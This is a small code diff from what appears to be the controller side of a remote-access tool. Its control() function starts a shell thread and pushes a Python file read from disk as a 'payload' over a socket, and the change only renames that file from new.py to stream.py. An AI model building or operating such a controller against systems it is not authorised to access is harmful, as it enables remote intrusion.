@@ -62,7 +62,7 @@ def control():
 			shell_thread.start()
 		elif(command=="2"):
 			s.send(b'stream')
-			file = open("new.py", mode='r')
+			file = open("stream.py", mode='r')
 			payload=file.read()
 			file.close()
 			payload=payload.encode()
